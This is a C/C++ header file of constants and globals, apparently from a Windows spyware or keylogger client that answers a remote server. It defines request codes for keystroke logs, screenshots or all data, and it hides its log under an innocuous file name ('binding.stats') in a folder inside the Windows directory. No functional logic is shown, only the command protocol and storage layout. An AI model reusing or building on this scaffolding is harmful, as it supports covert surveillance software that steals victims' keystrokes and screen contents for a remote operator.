// ERRORS

#pragma once

#define WM_PARSE_FILE	(WM_USER + 0)

#define EVERYTHING_OK					0
#define ERR_CANNOT_CONNECT				-2
#define INVALID_REQUEST					-7
#define RESPONSE_ALL_OK					0
#define RESPONSE_UPDATE_SUCCESS			1
#define RESPONSE_CONFIG_UPDATED			2
#define RESPONSE_FILE_RECEIVE_SUCCESS	3
#define RESPONSE_FILE_SIZE_MISMATCH		9
#define RESPONSE_NO_NEW_DATA			10
#define RESPONSE_PROGRAM_ERROR			-5


#define MESG_TYPE_UPDATE			200
#define MESG_TYPE_CONFIG			599
#define MESG_TYPE_LOG				600
#define MESG_TYPE_BITMAP			601
#define MESG_TYPE_UNKNOWN			50

#define REQUEST_CONFIG_FILE			799
#define REQUEST_KEYLOG_ONLY			800
#define REQUEST_SCREENS_ONLY		801
#define REQUEST_ALL_DATA			850

// GLOBAL CONSTANTS

static int ERROR_STATE = EVERYTHING_OK;			// Error status of program for reporting back to server
static LPCWSTR logFileName=L"binding.stats";				// File name of the log file
static LPCWSTR folder=L"AMS";							// This is the final directory
static TCHAR fName[MAX_PATH];					// Complete log file name
static TCHAR MAINDIR[MAX_PATH];					// This is the Windows directory, GetWindowsDirectory() used
												// Later we append "\AMS" to it
static TCHAR* configFileName=L"settings.config";			// Our configuration file
static bool UPDATE_STATUS = false;
